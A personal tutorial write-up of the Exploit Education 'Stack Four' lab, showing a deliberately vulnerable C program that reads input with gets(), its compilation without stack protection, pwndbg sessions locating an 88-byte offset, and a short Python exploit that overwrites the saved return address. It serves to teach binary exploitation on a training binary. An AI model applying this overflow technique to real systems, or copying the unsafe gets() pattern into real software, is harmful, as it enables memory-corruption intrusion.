---
description: 07/25/2023
---

# 4⃣ StackFour

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Let's get after it</p></figcaption></figure>

> Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

Note: Stack-Four was a <mark style="color:yellow;">drastic turning point in my binex career</mark>. I actually started following a methodology and using the correct tooling. Not perfect, but definitely a start. Hope you enjoy.&#x20;

Thanks @Kiwi & @MuthaGoos <3.

#### **Hints**

* The saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. [Did you know that some architectures may not save the return address on the stack in all cases?](https://en.wikipedia.org/wiki/Link\_register)
* GDB supports “run < my\_file” to direct input from my\_file into the program.

## Source Code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define LEVELNAME "mylevel"

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

Sounds like we will <mark style="color:yellow;">executing a classic buffer overflow by modifying the saved</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**return address**</mark> and pointing it to the `complete_level()` function.

## Source Code Analysis

```c
char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

We can see that `char` is acting as a pointer for `gets()`, meaning whatever we input will be stored somewhere. In this case, the 64-byte buffer (`buffer[64]`). This is achieved with `gets(buffer)`.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

I decided to start doing this locally rather than through `qemu`.&#x20;

I wanted to use `pwndbg` and `pwntools`.

Time to get modern.

## Compiling

```
gcc -g stack-four.c -o stack-four -fno-stack-protector
/usr/bin/ld: /tmp/cc1qYHfO.o: in function `start_level':
/home/user/Projects/exploit-ed/stack-four.c:22: warning: the `gets' function is dangerous and should not be used.
```

<mark style="color:yellow;">Compile this without the</mark> <mark style="color:yellow;"></mark>_<mark style="color:yellow;">**stack canary**</mark>_ <mark style="color:yellow;"></mark><mark style="color:yellow;">protection enabled</mark> or else you will get a <mark style="color:red;">terminated</mark> for **stack smashing** during exploitation:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>Stack smashing attempt -- canaries</p></figcaption></figure>

**Note**: We will learn how to get around these in the future, but we are just covering the basics for now! Don't let this discourage you!

Now that we have our program compiled, it's time to start debugging it.

## What is our goal?

Our goal is to answer the following:

1. How does our target binary consume data? -- `gets()`
2. Where does the data go in memory (on the stack)? -- Into our `buffer[]`
3. How much data do we need to get the return address? How far is the buffer from the return address? -- 96 bytes
4. Where do we want to divert execution to? In this case, we want to jump to `complete_level()`.

## Pwndbg

```
pwndbg stack-four
pwndbg: loaded 142 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from stack-four...
```

When I do this, I still like to have my `pwndbg` terminal on the left and my source code pulled up on the right.

Place breakpoint on the `start_level()` function:

```
pwndbg> b start_level 
Breakpoint 1 at 0x11d6: file stack-four.c, line 22.
pwndbg> run
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>

You can see that we are on the `gets()` function right before it gets called by the green arrow on line 22.

Grab `complete_level()` address:

```
print complete_level 
$2 = {void ()} 0x5555555551a9 <complete_level>
```

We can now see that we have the `complete_level()` <mark style="color:yellow;">function address</mark>: `0x5555555551a9`

This address is what we will place in our byte string in our exploit it little-endian format: `"\xa9\x51\x55\x55\x55\x55\x00\x00"`

You might be asking why this is important, <mark style="color:yellow;">it is because this is where we want to divert our execution to</mark>!!! Hence question four we asked above!

Let's work on finding our buffer address. Make sure to start a new fresh `pwndbg` session.

According to source code, we are creating a 64-byte buffer.&#x20;

Let's use `python3` to generate 64 A's for us:&#x20;

```
python3 -c 'print("A" *64)' > bufferTest.txt
```

The theory behind this is to pass our execution of `./stack-five` our `bufferTest.txt` as an argument.

We can now start `pwndbg` back up.

```
pwndbg> b start_level 
Breakpoint 1 at 0x11d6: file stack-four.c, line 22.
pwndbg> run
```

Now, let's examine our 60 words in our stack pointer register (rsp):

```
pwndbg> x/60wx $rsp
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption><p>This is after our buffer is filled with A's you will not see the 42's until after you do so.</p></figcaption></figure>

Stack analysis:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>Pink: Buffer Yellow = base pointer for main() Green = return address</p></figcaption></figure>

BOOM! We see our buffer is filled up with A's (`0x42`).&#x20;

We have now identified our buffer address.&#x20;

<mark style="color:yellow;">`0x7fffffffded0: BUFFER ADDRESS`</mark>

<mark style="color:yellow;">`0x7fffffffdf20`</mark><mark style="color:yellow;">+8=</mark><mark style="color:yellow;">`0x7fffffffdf28: RETURN ADDRESS`</mark>

The first thing we will see is our <mark style="color:yellow;">buffer address --</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0x7fffffffded0`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">(2)</mark>. We will want to ultimately subtract this from the address where our <mark style="color:yellow;">return address</mark> is being stored -- <mark style="color:yellow;">`0x7fffffffdf28`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">(1)</mark>.

Note: However, you are going to see <mark style="color:yellow;">`0x7fffffffdf20`</mark><mark style="color:yellow;">. This is because we add 8 to it and it will become</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0x7fffffffdf28`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">because that is that is the address of the 8 bytes before the location where the return address is being stored.</mark>

<figure><img src="../../../.gitbook/assets/image (15).png" alt="" width="290"><figcaption></figcaption></figure>

Here, we can see our padding required for our exploit which is 58 in hex and 88 in decimal:

```python
padding = b'A'*88
```

## `exploit.py`

Time to start breaking stuff:

```python
from pwn import *
import sys

padding = b'A'*88

sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(b"\xa9\x51\x55\x55\x55\x55\x00\x00")

# How does target binary consume data?
# Where does the data go in memory (on the stack)?
# How much data do we need to get to return address? -- How far is buffer from return address. 96 bytes
# Where do we want to divert execution to? -- In this case complete_level. If we wanted it to be a reverse shell it would be the start of our buffer.
# complete_level address 0x5555555551a9
```

We now want to send the output of our `exploit.py` script to a file called `exploit`:

```
python3 exploit.py > exploit
```

Examining exploit:

```
xxd exploit

00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 a951 5555 5555 0000  AAAAAAAA.QUUUU..
```

We see that the file is filled with `A`'s.

## Exploitation

<pre><code>pwndbg stack-four

<strong>pwndbg> b main
</strong>
pwndbg> run &#x3C; exploit

pwndbg> ni

pwndbg> ni

pwndbg> ni

pwndbg> ni

pwndbg> ni
and will be returning to 0x5555555551a9
Congratulations, you've finished mylevel :-) Well done!
[Inferior 1 (process 44758) exited normally]
</code></pre>

From here, you can see that we are calling line 30, `start_level()` since we replaced it with the address of `complete_level()` instead!!! Once we do this, we complete the level!

<figure><img src="../../../.gitbook/assets/image (2) (1) (3) (5).png" alt=""><figcaption></figcaption></figure>

## Trouble determining distance to the return address?

Yeah, me too.

<mark style="color:yellow;">There is another way that we can determine distance to the return address is to look at where the buffer is relative to the base pointer</mark>.

View <mark style="color:yellow;">disassembly for the</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`start_level()`</mark> function:

<figure><img src="../../../.gitbook/assets/image (7) (11).png" alt=""><figcaption></figcaption></figure>

If we pay attention to the load effective address (lea) instruction, we can infer that the return address is `0x50` or `80` bytes from the base pointer (rbp).&#x20;

`+ 8` bytes for the old base pointer (rbp) gives a distance of `0x58` or `88` bytes <mark style="color:yellow;">between the buffer and the return address</mark>. This is where our 88 comes from.

The return address we want to overwrite is another `8` bytes, we add it and we will get a <mark style="color:yellow;">TOTAL payload size</mark> of `0x60` or `96` bytes.

How is it `96` bytes you ask?

Refer back to our exploit.py code:

```python
padding = b'A'*88

sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(b"\xa9\x51\x55\x55\x55\x55\x00\x00")
```

We have our distance of `88` bytes between our buffer and return address.

The next `8` bytes comes from our additional return address from the `complete_level()` function address in memory!

## Conclusion

If you are following along, I know this is difficult just keep staying at it, it gets easier, I promise.
